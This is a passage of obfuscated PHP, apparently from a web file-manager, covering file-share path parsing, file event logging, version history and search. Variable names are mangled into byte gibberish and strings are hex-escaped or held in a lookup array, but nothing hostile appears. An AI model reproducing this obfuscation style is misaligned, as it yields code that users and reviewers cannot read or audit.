IO::link($¶‹è»üƒ[$_SERVER[Ãìšã«™][78]], $èíÔ†Ø–); } protected function parse($ëÒ‚¼‡) { $ğ³½·’ =& $_SERVER[Ãìšã«™]; if (strstr($ëÒ‚¼‡, $ğ³½·’[8]) === !1) { return array($ğ³½·’[420] => intval($ëÒ‚¼‡), $ğ³½·’[78] => $ğ³½·’[12], $ğ³½·’[1322] => array()); } $á‹àğ¸‡ = explode($ğ³½·’[8], trim($ëÒ‚¼‡, $ğ³½·’[8])); if (count($á‹àğ¸‡) < 2) { show_tips(clear_html($ëÒ‚¼‡) . $ğ³½·’[1328]); } return array($ğ³½·’[420] => intval($á‹àğ¸‡[0]), $ğ³½·’[78] => $á‹àğ¸‡[1], $ğ³½·’[1322] => array_slice($á‹àğ¸‡, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ıíœŠøÌ) { $this->pathParse = $ıíœŠøÌ; $this->model = Model($_SERVER[Ãìšã«™][1321]); } public function getPathOuter($Çß´§·¤) { $¾¬±¸ëÇ =& $_SERVER[Ãìšã«™]; if (!$Çß´§·¤) { return $Çß´§·¤; } $œËóçéÀ = $this->parse($Çß´§·¤); return trim(KodIO::makeShare($this->pathParse[$¾¬±¸ëÇ[392]], $œËóçéÀ[$¾¬±¸ëÇ[392]]), $¾¬±¸ëÇ[8]); } protected function infoParse($Œòˆ’è, $îÊ±­ì„ = false, $Ì‚Ô¼’è = false) { $§›™İêÍ =& $_SERVER[Ãìšã«™]; $’¹¯›ÏÜ = $this->pathParse[$§›™İêÍ[392]]; $ı˜éü— = trim($this->pathParse[$§›™İêÍ[1163]], $§›™İêÍ[8]); return Action($§›™İêÍ[1329])->sharePathInfo($’¹¯›ÏÜ, $ı˜éü—, $îÊ±­ì„); } public function infoFull($ù„Œ½ú) { $Œ„¡¯‡® =& $_SERVER[Ãìšã«™]; $ˆÉúí¬÷ = explode($Œ„¡¯‡®[8], trim($ù„Œ½ú, $Œ„¡¯‡®[8])); if (count($ˆÉúí¬÷) > 1) { $ËšÛó½õ = implode($Œ„¡¯‡®[8], array_splice($ˆÉúí¬÷, 1)); $º’Öó µ = $this->model->pathInfoByPath($ˆÉúí¬÷[0], $ËšÛó½õ); if (!$º’Öó µ) { return !1; } $this->pathParse[$Œ„¡¯‡®[1163]] = $º’Öó µ[$Œ„¡¯‡®[403]]; } return $this->infoParse($ù„Œ½ú); } public function listAll($ÃıĞä»Ø) { $Ú‚ƒ¬Ÿ— =& $_SERVER[Ãìšã«™]; $Ôòæ™›¢ = IO::info($this->pathParse[$Ú‚ƒ¬Ÿ—[78]]); if (!$Ôòæ™›¢) { return array(); } $ÈÁÂã”† = $this->model->listAll($ÃıĞä»Ø); $Š™ûÎĞ¨ = Model($Ú‚ƒ¬Ÿ—[595])->getInfo($Ôòæ™›¢[$Ú‚ƒ¬Ÿ—[488]]); $œîíâúß = Action($Ú‚ƒ¬Ÿ—[1329]); foreach ($ÈÁÂã”† as &$àÁ¯ªÀ„) { check_abort(); $àÁ¯ªÀ„[$Ú‚ƒ¬Ÿ—[87]] = $œîíâúß->_shareItemeParse($àÁ¯ªÀ„[$Ú‚ƒ¬Ÿ—[87]], $Š™ûÎĞ¨); } unset($àÁ¯ªÀ„); return $ÈÁÂã”†; } } goto BøÔÙ•Ç; Eêèùäìš: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\x72\143\145\x5f\x65\x76\x65\156\x74"; protected $dataAuto = array(array("\x63\162\145\x61\x74\145\x54\x69\155\x65", "\164\x69\155\145", "\151\156\x73\x65\162\x74", "\146\x75\x6e\x63\x74\151\157\x6e"), array("\x64\x65\163\143", '', "\151\156\163\x65\162\x74\54\x75\x70\x64\x61\x74\x65\x2c\163\145\x6c\145\x63\164", "\x6a\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($°»Œ¯«, $óÛğœéµ, $û´€¯¤Ù = '') { $«ÉÆà¸÷ =& $_SERVER[Ãìšã«™]; if (!$this->eventSave) { return; } $³æ³“ = Model($«ÉÆà¸÷[1321])->sourceInfo($°»Œ¯«); if (!$³æ³“) { return !1; } if ($this->isCacheEvent($³æ³“, $óÛğœéµ)) { return; } if ($û´€¯¤Ù && is_string($û´€¯¤Ù)) { $û´€¯¤Ù = array($«ÉÆà¸÷[1856] => $û´€¯¤Ù); } $¯Àı“×ñ = array($«ÉÆà¸÷[418] => $°»Œ¯«, $«ÉÆà¸÷[2030] => $³æ³“[$«ÉÆà¸÷[498]], $«ÉÆà¸÷[2031] => $³æ³“[$«ÉÆà¸÷[32]], $«ÉÆà¸÷[519] => !empty($³æ³“[$«ÉÆà¸÷[519]]) ? $³æ³“[$«ÉÆà¸÷[519]] : $«ÉÆà¸÷[12], $«ÉÆà¸÷[1641] => USER_ID, $«ÉÆà¸÷[423] => $óÛğœéµ, $«ÉÆà¸÷[1643] => $û´€¯¤Ù); $this->addSystemLog($óÛğœéµ, $¯Àı“×ñ); unset($¯Àı“×ñ[$«ÉÆà¸÷[2031]], $¯Àı“×ñ[$«ÉÆà¸÷[519]]); return $this->add($¯Àı“×ñ); } private function addSystemLog($œ¥›§Âë, $¢ØÁ¯÷) { $ÃÑ‚Î˜­ =& $_SERVER[Ãìšã«™]; if ($œ¥›§Âë == $ÃÑ‚Î˜­[2032]) { $œ¥›§Âë = $¢ØÁ¯÷[$ÃÑ‚Î˜­[451]][$ÃÑ‚Î˜­[2033]]; } else { if (in_array($œ¥›§Âë, array($ÃÑ‚Î˜­[1798], $ÃÑ‚Î˜­[2034]))) { $œ¥›§Âë = $¢ØÁ¯÷[$ÃÑ‚Î˜­[451]][$ÃÑ‚Î˜­[756]]; } } $‰­‰äİ = array_merge($¢ØÁ¯÷, array($ÃÑ‚Î˜­[2035] => $¢ØÁ¯÷[$ÃÑ‚Î˜­[403]], $ÃÑ‚Î˜­[2036] => $¢ØÁ¯÷[$ÃÑ‚Î˜­[2036]])); Hook::trigger($ÃÑ‚Î˜­[2037], $ÃÑ‚Î˜­[2038] . $œ¥›§Âë, $¢ØÁ¯÷); Model($ÃÑ‚Î˜­[1762])->addLog($ÃÑ‚Î˜­[2038] . $œ¥›§Âë, $‰­‰äİ); } private function isCacheEvent($â…¿ÉÔ“, $ò±¶Å–Û) { if ($â…¿ÉÔ“[$_SERVER[Ãìšã«™][412]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($ş¨Ï·ç·, $¾¦š¸ú ) { $Øº½—†Ñ =& $_SERVER[Ãìšã«™]; $³Ñà‡ = Model($Øº½—†Ñ[1321])->sourceInfo($ş¨Ï·ç·); $Ø¾´ºç˜ = array($Øº½—†Ñ[2033] => $¾¦š¸ú , $Øº½—†Ñ[32] => $³Ñà‡[$Øº½—†Ñ[32]]); return $this->addEvent($ş¨Ï·ç·, $Øº½—†Ñ[2032], $Ø¾´ºç˜); } public function eventFileEdit($ŒÔ²—Şù) { $¯ñ§‡Å” =& $_SERVER[Ãìšã«™]; $úûéâ¦á = array($¯ñ§‡Å”[2039] => $_SERVER[$¯ñ§‡Å”[2040]], $¯ñ§‡Å”[2041] => strtolower(ACTION)); return $this->addEvent($ŒÔ²—Şù, $¯ñ§‡Å”[1788], $úûéâ¦á); } public function eventRecycle($ĞêÔÙ, $‰¤øêœÊ) { return $this->addEvent($ĞêÔÙ, $_SERVER[Ãìšã«™][2034], $‰¤øêœÊ); } public function eventRemove($µø°ø¾†) { $ßãÑƒ‰“ =& $_SERVER[Ãìšã«™]; $ÆÀ‘°ğ = Model($ßãÑƒ‰“[1321])->sourceInfo($µø°ø¾†); $ÕÅ¼ıëõ = $ÆÀ‘°ğ[$ßãÑƒ‰“[32]]; return $this->addEvent($ÆÀ‘°ğ[$ßãÑƒ‰“[498]], $ßãÑƒ‰“[1787], $ÕÅ¼ıëõ); } public function eventShare($ğ¾‹ı¨¿, $ö´²ş) { return $this->addEvent($ğ¾‹ı¨¿, $_SERVER[Ãìšã«™][1798], $ö´²ş); } public function eventMove($¦áŞÙ”, $¹¿™Ò­Ô, $ÜÓ±÷ ) { $ÑÊĞÛµ‡ =& $_SERVER[Ãìšã«™]; $¾±‘—†ª = Model($ÑÊĞÛµ‡[1321]); $èŸ°ì¯ = $¾±‘—†ª->sourceInfo($¦áŞÙ”); $©ÖƒÚ¡à = $¾±‘—†ª->sourceInfo($¹¿™Ò­Ô); $À…òàŠ³ = $¾±‘—†ª->sourceInfo($ÜÓ±÷ ); $œşÒÆÕ = array($ÑÊĞÛµ‡[1154] => $¹¿™Ò­Ô, $ÑÊĞÛµ‡[2042] => $©ÖƒÚ¡à[$ÑÊĞÛµ‡[32]], $ÑÊĞÛµ‡[2021] => !empty($©ÖƒÚ¡à[$ÑÊĞÛµ‡[519]]) ? $©ÖƒÚ¡à[$ÑÊĞÛµ‡[519]] : $ÑÊĞÛµ‡[12], $ÑÊĞÛµ‡[1155] => $ÜÓ±÷ , $ÑÊĞÛµ‡[2043] => $À…òàŠ³[$ÑÊĞÛµ‡[32]], $ÑÊĞÛµ‡[2044] => !empty($À…òàŠ³[$ÑÊĞÛµ‡[519]]) ? $À…òàŠ³[$ÑÊĞÛµ‡[519]] : $ÑÊĞÛµ‡[12]); $this->addEvent($¦áŞÙ”, $ÑÊĞÛµ‡[551], $œşÒÆÕ); $èŸ°ì¯ = $¾±‘—†ª->sourceInfo($¦áŞÙ”); $œşÒÆÕ = array($ÑÊĞÛµ‡[403] => $èŸ°ì¯[$ÑÊĞÛµ‡[403]], $ÑÊĞÛµ‡[32] => $èŸ°ì¯[$ÑÊĞÛµ‡[32]]); $this->addEvent($¹¿™Ò­Ô, $ÑÊĞÛµ‡[2045], $œşÒÆÕ); } public function eventCopy($‘ İµøà) { $this->eventCreate($‘ İµøà, $_SERVER[Ãìšã«™][549]); } public function eventRename($„ÕÓ‘ôò, $šÀŞÜ®, $Óù¿º×ê) { $…Œ³‡Ë¿ =& $_SERVER[Ãìšã«™]; $ïî™­óÓ = array($…Œ³‡Ë¿[1154] => $šÀŞÜ®, $…Œ³‡Ë¿[1155] => $Óù¿º×ê); return $this->addEvent($„ÕÓ‘ôò, $…Œ³‡Ë¿[1336], $ïî™­óÓ); } public function eventAddComment($…ß²Ç, $ğº«…Ù·) { return $this->addEvent($…ß²Ç, $_SERVER[Ãìšã«™][2046], $ğº«…Ù·); } public function eventAddDesc($¿âíÉ©, $§¨±ô×©) { return $this->addEvent($¿âíÉ©, $_SERVER[Ãìšã«™][2047], $§¨±ô×©); } public function listBySource($«¨×¹õÕ) { $ùÊ„ÓÅº =& $_SERVER[Ãìšã«™]; $«ÌÙ­ë = Model($ùÊ„ÓÅº[1321])->sourceInfo($«¨×¹õÕ); $ñõù¿Ö = array($ùÊ„ÓÅº[418] => $«¨×¹õÕ); if ($«ÌÙ­ë[$ùÊ„ÓÅº[411]] == $ùÊ„ÓÅº[89]) { $Èüãóº¢ = Model($ùÊ„ÓÅº[1321])->listSearchChildren($«¨×¹õÕ, 20000); $Èüãóº¢[] = $«¨×¹õÕ . $ùÊ„ÓÅº[373]; $ñõù¿Ö = array($ùÊ„ÓÅº[403] => array($ùÊ„ÓÅº[7], $Èüãóº¢)); } $·ˆî•”¿ = $this->where($ñõù¿Ö)->order($ùÊ„ÓÅº[2048])->selectPage(); if ($·ˆî•”¿[$ùÊ„ÓÅº[361]][$ùÊ„ÓÅº[362]] == 0) { $·ˆî•”¿[$ùÊ„ÓÅº[361]][$ùÊ„ÓÅº[362]] = 1; $·ˆî•”¿[$ùÊ„ÓÅº[364]] = array(array($ùÊ„ÓÅº[418] => $«¨×¹õÕ, $ùÊ„ÓÅº[2030] => $«ÌÙ­ë[$ùÊ„ÓÅº[498]], $ùÊ„ÓÅº[1641] => $«ÌÙ­ë[$ùÊ„ÓÅº[452]], $ùÊ„ÓÅº[423] => $ùÊ„ÓÅº[2049], $ùÊ„ÓÅº[424] => $«ÌÙ­ë[$ùÊ„ÓÅº[193]], $ùÊ„ÓÅº[1643] => $ùÊ„ÓÅº[12])); } return $this->eventListParse($·ˆî•”¿, $«¨×¹õÕ); } private function eventListParse($’¾ÏÑñŠ, $¤ÕĞ±) { $å‰İ÷¦Ø =& $_SERVER[Ãìšã«™]; $“˜âı¶à = $’¾ÏÑñŠ[$å‰İ÷¦Ø[364]]; $ˆóÙ¤²İ = array_to_keyvalue($“˜âı¶à, $å‰İ÷¦Ø[12], $å‰İ÷¦Ø[403]); $üÙû¥å = array_to_keyvalue($“˜âı¶à, $å‰İ÷¦Ø[12], $å‰İ÷¦Ø[2036]); foreach ($“˜âı¶à as $¨ª„¡¼É) { $·úïµÀ† = $¨ª„¡¼É[$å‰İ÷¦Ø[451]]; if ($¨ª„¡¼É[$å‰İ÷¦Ø[33]] == $å‰İ÷¦Ø[551] && isset($·úïµÀ†[$å‰İ÷¦Ø[1154]])) { $ˆóÙ¤²İ[] = $·úïµÀ†[$å‰İ÷¦Ø[1154]] . $å‰İ÷¦Ø[12]; $ˆóÙ¤²İ[] = $·úïµÀ†[$å‰İ÷¦Ø[1155]] . $å‰İ÷¦Ø[12]; } if ($¨ª„¡¼É[$å‰İ÷¦Ø[33]] == $å‰İ÷¦Ø[2045] && isset($·úïµÀ†[$å‰İ÷¦Ø[403]])) { $ˆóÙ¤²İ[] = $·úïµÀ†[$å‰İ÷¦Ø[403]] . $å‰İ÷¦Ø[12]; } } $ˆóÙ¤²İ = array_merge($ˆóÙ¤²İ, $üÙû¥å, array($¤ÕĞ± . $å‰İ÷¦Ø[12])); $ˆóÙ¤²İ = array_unique($ˆóÙ¤²İ); $ÃüÃÔûª = array_unique(array_to_keyvalue($“˜âı¶à, $å‰İ÷¦Ø[12], $å‰İ÷¦Ø[1650])); $áé¹Ìşü = Model($å‰İ÷¦Ø[538])->userListInfo($ÃüÃÔûª); $²’Ä¼ãæ = Model($å‰İ÷¦Ø[826])->sourceListInfo($ˆóÙ¤²İ, !0); foreach ($“˜âı¶à as &$¨ª„¡¼É) { if ($¨ª„¡¼É[$å‰İ÷¦Ø[33]] == $å‰İ÷¦Ø[551] && isset($¨ª„¡¼É[$å‰İ÷¦Ø[451]][$å‰İ÷¦Ø[1154]])) { $¨ª„¡¼É[$å‰İ÷¦Ø[451]][$å‰İ÷¦Ø[1154]] = $²’Ä¼ãæ[$¨ª„¡¼É[$å‰İ÷¦Ø[451]][$å‰İ÷¦Ø[1154]]]; $¨ª„¡¼É[$å‰İ÷¦Ø[451]][$å‰İ÷¦Ø[1155]] = $²’Ä¼ãæ[$¨ª„¡¼É[$å‰İ÷¦Ø[451]][$å‰İ÷¦Ø[1155]]]; } if ($¨ª„¡¼É[$å‰İ÷¦Ø[33]] == $å‰İ÷¦Ø[2045] && isset($¨ª„¡¼É[$å‰İ÷¦Ø[451]][$å‰İ÷¦Ø[403]])) { $¨ª„¡¼É[$å‰İ÷¦Ø[451]][$å‰İ÷¦Ø[403]] = $²’Ä¼ãæ[$¨ª„¡¼É[$å‰İ÷¦Ø[451]][$å‰İ÷¦Ø[403]]]; } $¨ª„¡¼É[$å‰İ÷¦Ø[87]] = $²’Ä¼ãæ[$¨ª„¡¼É[$å‰İ÷¦Ø[403]]]; $¨ª„¡¼É[$å‰İ÷¦Ø[2050]] = $²’Ä¼ãæ[$¨ª„¡¼É[$å‰İ÷¦Ø[2036]]]; if ($¨ª„¡¼É[$å‰İ÷¦Ø[33]] == $å‰İ÷¦Ø[1787]) { $¨ª„¡¼É[$å‰İ÷¦Ø[2050]] = $¨ª„¡¼É[$å‰İ÷¦Ø[87]]; $¨ª„¡¼É[$å‰İ÷¦Ø[2036]] = $¨ª„¡¼É[$å‰İ÷¦Ø[2050]][$å‰İ÷¦Ø[403]]; $¨ª„¡¼É[$å‰İ÷¦Ø[87]] = !1; $¨ª„¡¼É[$å‰İ÷¦Ø[403]] = $å‰İ÷¦Ø[12]; } $¨ª„¡¼É[$å‰İ÷¦Ø[1981]] = $áé¹Ìşü[$¨ª„¡¼É[$å‰İ÷¦Ø[1650]]]; } unset($¨ª„¡¼É); $’¾ÏÑñŠ[$å‰İ÷¦Ø[364]] = $“˜âı¶à; return $’¾ÏÑñŠ; } public function removeBySource($À±ìƒş) { $³Ÿ÷’ªÜ = array($_SERVER[Ãìšã«™][418] => $À±ìƒş); $this->where($³Ÿ÷’ªÜ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\165\162\143\145\137\150\x69\x73\x74\x6f\x72\171"; public function historyCount($ğªÇ¼æ) { $ıíù£‰ =& $_SERVER[Ãìšã«™]; if (!$ğªÇ¼æ) { return array(); } if (is_string($ğªÇ¼æ) || is_int($ğªÇ¼æ)) { $ğªÇ¼æ = array($ğªÇ¼æ); } $û”®ƒ×Ø = array($ıíù£‰[403], $ıíù£‰[1850] => $ıíù£‰[500]); $ûä˜ìæ = array($ıíù£‰[403] => array($ıíù£‰[7], $ğªÇ¼æ)); $ööŸµì· = $this->field($û”®ƒ×Ø)->where($ûä˜ìæ)->group($ıíù£‰[403])->select(); return array_to_keyvalue($ööŸµì·, $ıíù£‰[403], $ıíù£‰[500]); } public function addHistory($¿ƒÕ‰Ò¤, $÷ÊÓÔ×İ = '') { $¬¾ÓáÙÏ =& $_SERVER[Ãìšã«™]; $îÑ‡æš = array($¬¾ÓáÙÏ[418] => $¿ƒÕ‰Ò¤[$¬¾ÓáÙÏ[403]], $¬¾ÓáÙÏ[1641] => isset($¿ƒÕ‰Ò¤[$¬¾ÓáÙÏ[454]]) ? $¿ƒÕ‰Ò¤[$¬¾ÓáÙÏ[454]] : $¿ƒÕ‰Ò¤[$¬¾ÓáÙÏ[452]], $¬¾ÓáÙÏ[468] => $¿ƒÕ‰Ò¤[$¬¾ÓáÙÏ[467]], $¬¾ÓáÙÏ[579] => $¿ƒÕ‰Ò¤[$¬¾ÓáÙÏ[80]], $¬¾ÓáÙÏ[2051] => $÷ÊÓÔ×İ); $ÅÚìŠ¿Ğ = $GLOBALS[$¬¾ÓáÙÏ[6]][$¬¾ÓáÙÏ[90]][$¬¾ÓáÙÏ[1203]]; if ($ÅÚìŠ¿Ğ > 1) { $this->historyAutoClear($îÑ‡æš[$¬¾ÓáÙÏ[403]]); $this->add($îÑ‡æš); } Hook::trigger($¬¾ÓáÙÏ[2052], $îÑ‡æš); Model($¬¾ÓáÙÏ[2053])->eventFileEdit($¿ƒÕ‰Ò¤[$¬¾ÓáÙÏ[403]]); } private function historyAutoClear($úƒÒÌº”) { $‡Ê¯Â” =& $_SERVER[Ãìšã«™]; $™êç‡Íô = Model($‡Ê¯Â”[771])->get($‡Ê¯Â”[1225]); $ÅğİÙşø = $GLOBALS[$‡Ê¯Â”[6]][$‡Ê¯Â”[90]][$‡Ê¯Â”[1203]]; $ø–»Ç¡ = $™êç‡Íô == $‡Ê¯Â”[1226] ? 5 : $ÅğİÙşø; if ($ÅğİÙşø <= 1) { $ø–»Ç¡ = 1; } if ($ø–»Ç¡ >= 500) { return; } $šµÏ©Œ = array($‡Ê¯Â”[418] => $úƒÒÌº”); $€ÜŸ§·Õ = $this->field($‡Ê¯Â”[2054])->where($šµÏ©Œ)->order($‡Ê¯Â”[2048])->select(); if (!$€ÜŸ§·Õ || $ø–»Ç¡ >= count($€ÜŸ§·Õ)) { return; } $ƒ«¯¨È = array_to_keyvalue($€ÜŸ§·Õ, $‡Ê¯Â”[12], $‡Ê¯Â”[392]); $ƒ«¯¨È = array_slice($ƒ«¯¨È, $ø–»Ç¡); $÷—Á¯‡ = array_to_keyvalue($€ÜŸ§·Õ, $‡Ê¯Â”[12], $‡Ê¯Â”[467]); $÷—Á¯‡ = array_slice($÷—Á¯‡, $ø–»Ç¡); if (!$ƒ«¯¨È || !$÷—Á¯‡) { return; } $šµÏ©Œ = array($‡Ê¯Â”[420] => array($‡Ê¯Â”[7], $ƒ«¯¨È)); $this->where($šµÏ©Œ)->delete(); Model($‡Ê¯Â”[470])->remove($÷—Á¯‡); } public function listData($ÆšğôÕ) { $Ğ”«‚¿¢ =& $_SERVER[Ãìšã«™]; $µÀºÎÉŸ = array($Ğ”«‚¿¢[418] => $ÆšğôÕ); $˜ÕØ˜ü = $Ğ”«‚¿¢[2055]; $åÓ ‰†¨ = $this->field($˜ÕØ˜ü)->where($µÀºÎÉŸ)->order($Ğ”«‚¿¢[2048])->selectPage(); $this->_listAppendUser($åÓ ‰†¨[$Ğ”«‚¿¢[364]]); $ğõ‹Í…ù = Model($Ğ”«‚¿¢[771])->get($Ğ”«‚¿¢[1225]); $¸µù…Ü = 5; if ($ğõ‹Í…ù == $Ğ”«‚¿¢[1226]) { $åÓ ‰†¨[$Ğ”«‚¿¢[364]] = array_slice($åÓ ‰†¨[$Ğ”«‚¿¢[364]], 0, $¸µù…Ü); $åÓ ‰†¨[$Ğ”«‚¿¢[361]] = array($Ğ”«‚¿¢[2056] => 1, $Ğ”«‚¿¢[2057] => 20, $Ğ”«‚¿¢[2058] => 1, $Ğ”«‚¿¢[2059] => count($åÓ ‰†¨[$Ğ”«‚¿¢[364]])); } return $åÓ ‰†¨; } protected function _listAppendUser(&$Ÿà€¸¶ğ) { $Ş·‹â¢´ =& $_SERVER[Ãìšã«™]; $ÓÈÌşÄ¬ = array_to_keyvalue($Ÿà€¸¶ğ, $Ş·‹â¢´[12], $Ş·‹â¢´[1650]); $ä±Ü×Õ‚ = Model($Ş·‹â¢´[538])->userListInfo($ÓÈÌşÄ¬); foreach ($Ÿà€¸¶ğ as &$ŠÃÉé÷İ) { $à «á§Š = $ŠÃÉé÷İ[$Ş·‹â¢´[1650]]; $ŠÃÉé÷İ[$Ş·‹â¢´[452]] = $ä±Ü×Õ‚[$à «á§Š] ? $ä±Ü×Õ‚[$à «á§Š] : !1; } unset($ŠÃÉé÷İ); } public function fileInfo($âÁŒåãÆ) { $¼×ÒÆ½ı =& $_SERVER[Ãìšã«™]; $ÙÖøæ˜À = $this->tablePrefix; $¿ù“›‘Ë = "{$ÙÖøæ˜À}\151\x6f\x5f\x66\151\154\145\x20\x66\x69\154\x65\163\x20\x6f\x6e\x20\x66\151\x6c\x65\x73\x2e\146\x69\x6c\145\111\104\40\x3d\40\150\151\163\164\157\x72\x79\56\146\151\x6c\145\111\x44"; return $this->alias($¼×ÒÆ½ı[2060])->where(array($¼×ÒÆ½ı[420] => $âÁŒåãÆ))->join($¿ù“›‘Ë, $¼×ÒÆ½ı[2061])->find(); } public function removeItem($¯˜Ÿšş×) { $Ùó½ä¾Ì =& $_SERVER[Ãìšã«™]; $³ÑùÛá¹ = array($Ùó½ä¾Ì[420] => $¯˜Ÿšş×); $º£“»ƒ = $this->where($³ÑùÛá¹)->find(); if ($º£“»ƒ) { $÷Áê‡Ì§ = $this->where($³ÑùÛá¹)->delete(); Model($Ùó½ä¾Ì[470])->remove($º£“»ƒ[$Ùó½ä¾Ì[467]]); return $÷Áê‡Ì§; } return !1; } public function removeBySource($›ÄïÕÁú) { $ÓÊ¯éå˜ =& $_SERVER[Ãìšã«™]; if (!$›ÄïÕÁú) { return !1; } if (!is_array($›ÄïÕÁú)) { $›ÄïÕÁú = array($›ÄïÕÁú); } $ ‹ÔÚÊ = array($ÓÊ¯éå˜[418] => array($ÓÊ¯éå˜[7], $›ÄïÕÁú)); $ŒœŠÈ‰Ó = $this->field($ÓÊ¯éå˜[468])->where($ ‹ÔÚÊ)->select(); if ($ŒœŠÈ‰Ó) { $this->where($ ‹ÔÚÊ)->delete(); $·ñ„¯¡ = array_to_keyvalue($ŒœŠÈ‰Ó, $ÓÊ¯éå˜[12], $ÓÊ¯éå˜[467]); Model($ÓÊ¯éå˜[470])->remove($·ñ„¯¡); } return !0; } public function setDetail($¯®šØæ, $—¹ò“Í£) { $üÏâÍ¶ë =& $_SERVER[Ãìšã«™]; return $this->where(array($üÏâÍ¶ë[420] => $¯®šØæ))->save(array($üÏâÍ¶ë[2051] => $—¹ò“Í£)); } public function rollbackToItem($ª¤¤øêô, $Ô÷ñş¿›) { $ÜßÂøÔş =& $_SERVER[Ãìšã«™]; $ôØÃ¡à = Model($ÜßÂøÔş[826])->sourceInfo($ª¤¤øêô); $this->addHistory($ôØÃ¡à, LNG($ÜßÂøÔş[2062])); $øÆ”……´ = $this->find($Ô÷ñş¿›); $áÛ©í´Ü = array($ÜßÂøÔş[467] => $øÆ”……´[$ÜßÂøÔş[467]], $ÜßÂøÔş[80] => $øÆ”……´[$ÜßÂøÔş[80]], $ÜßÂøÔş[86] => time(), $ÜßÂøÔş[454] => USER_ID); Model($ÜßÂøÔş[826])->where(array($ÜßÂøÔş[403] => $ª¤¤øêô))->save($áÛ©í´Ü); return $this->where(array($ÜßÂøÔş[420] => $Ô÷ñş¿›))->delete(); } public function clearSame($è’ª³ü÷) { $Ğ›Éûïó =& $_SERVER[Ãìšã«™]; $Ñå­Ó—ó = $this->listData($è’ª³ü÷); $´Ùº‘Á¢ = array_to_keyvalue_group($Ñå­Ó—ó, $Ğ›Éûïó[467]); $Ë×ã¬ÛÀ = array(); $ÊÈ†ïää = array(); foreach ($´Ùº‘Á¢ as $Ò¡­ÉÃ) { if (!$Ò¡­ÉÃ || count($Ò¡­ÉÃ) <= 1) { continue; } foreach ($Ò¡­ÉÃ as $ù½ƒœ¯°) { $Ë×ã¬ÛÀ[] = $ù½ƒœ¯°[$Ğ›Éûïó[467]]; $ÊÈ†ïää[] = $ù½ƒœ¯°[$Ğ›Éûïó[392]]; } } if (!$ÊÈ†ïää) { return; } $this->where(array($Ğ›Éûïó[392] => array($Ğ›Éûïó[7], $ÊÈ†ïää)))->delete(); Model($Ğ›Éûïó[470])->remove($Ë×ã¬ÛÀ); } public function userSpace() { $ë‘í¾ö‰ =& $_SERVER[Ãìšã«™]; $ššüÆ–ù = $this->tablePrefix; $Üâ´µš = array($ë‘í¾ö‰[1641] => USER_ID); $¿ „êôê = "{$ššüÆ–ù}\151\157\137\x66\x69\x6c\x65\40\x66\151\x6c\145\163\40\157\156\40\146\151\154\x65\x73\x2e\x66\x69\x6c\145\111\x44\40\x3d\x20\x68\x69\x73\x74\x6f\x72\171\56\146\151\154\145\x49\104"; return $this->alias($ë‘í¾ö‰[2060])->where($Üâ´µš)->join($¿ „êôê, $ë‘í¾ö‰[2061])->sum($ë‘í¾ö‰[80]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($æû†§Ò÷) { $Ìíà„‡ =& $_SERVER[Ãìšã«™]; $Œö‘³û = KodIO::fileTypeList(); $ô„«õ² = $Œö‘³û[$æû†§Ò÷]; if (!$ô„«õ²) { return array(); } $ì¢†Öö« = $ô„«õ²[$Ìíà„‡[167]]; $‡ëË¹Ø» = $Ìíà„‡[7]; if (!$ô„«õ²[$Ìíà„‡[167]]) { $üŠ²÷øÍ = array_to_keyvalue($Œö‘³û, $Ìíà„‡[12], $Ìíà„‡[167]); $ì¢†Öö« = implode($Ìíà„‡[50], $üŠ²÷øÍ); $‡ëË¹Ø» = $Ìíà„‡[2063]; } $·öª¡‹Ş = explode($Ìíà„‡[50], trim($ì¢†Öö«, $Ìíà„‡[50])); return array($‡ëË¹Ø», $·öª¡‹Ş); } public function listPathType($”Û‡ı×Å) { $ëÙÊõ ò =& $_SERVER[Ãìšã«™]; $ˆ‡ıŠğ¬ = $this->fileTypeWhere($”Û‡ı×Å); if (!$ˆ‡ıŠğ¬) { return array(); } $¸Üò¡íŞ = array($ëÙÊõ ò[580] => SourceModel::TYPE_USER, $ëÙÊõ ò[581] => USER_ID, $ëÙÊõ ò[577] => 0, $ëÙÊõ ò[578] => $ˆ‡ıŠğ¬); return $this->listSource($¸Üò¡íŞ); } public function listSearch($±§ëüœ‹, $’¶ÌæÁÂ = 300) { $Ãğ €¸ =& $_SERVER[Ãìšã«™]; if (isset($±§ëüœ‹[$Ãğ €¸[1909]]) && $±§ëüœ‹[$Ãğ €¸[1909]]) { $±§ëüœ‹[$Ãğ €¸[1909]] = str_replace($Ãğ €¸[379], $Ãğ €¸[2064], trim($±§ëüœ‹[$Ãğ €¸[1909]])); } $×—ïéûÊ = $this->_parseSearchWhere($±§ëüœ‹); $ÎœÅëĞ = $×—ïéûÊ; if (!isset($×—ïéûÊ[$Ãğ €¸[431]])) { $×—ïéûÊ[$Ãğ €¸[431]] = 0; } $¼Ãüµ‰ƒ = $Ãğ €¸[2065]; $á¡åÀÈò = $¼Ãüµ‰ƒ; $this->_listSearchBindPinyin($±§ëüœ‹, $×—ïéûÊ, $¼Ãüµ‰ƒ); $this->alias($Ãğ €¸[444])->_makeOrder(); $×—ïéûÊ = $this->parseWhereLike($×—ïéûÊ); $ùğäƒ­ = $this->distinct(!0)->field($¼Ãüµ‰ƒ)->where($×—ïéûÊ)->selectPage($’¶ÌæÁÂ); $this->_listSearchFileContent($ùğäƒ­, $±§ëüœ‹, $á¡åÀÈò, $ÎœÅëĞ); $this->_listSearchDesc($ùğäƒ­, $±§ëüœ‹, $á¡åÀÈò); $this->_listSearchTag($ùğäƒ­, $±§ëüœ‹, $á¡åÀÈò); $this->_listSearchGroupTag($ùğäƒ­, $±§ëüœ‹, $á¡åÀÈò); $this->_listDataApply($ùğäƒ­[$Ãğ €¸[364]]); $this->_listMake($ùğäƒ­); return $ùğäƒ­; } private function _listSearchFileContent(&$ä»¥ŒÃÙ, $«äá×Óà, $§û€´¹, $õóÀ“ù·) { $­›­õó =& $_SERVER[Ãìšã«™]; if (!$«äá×Óà[$­›­õó[1909]] || $ä»¥ŒÃÙ[$­›­õó[361]][$­›­õó[348]] > 1) { return; } if (!isset($õóÀ“ù·[$­›­õó[32]]) || !is_array($«äá×Óà[$­›­õó[467]])) { return; } 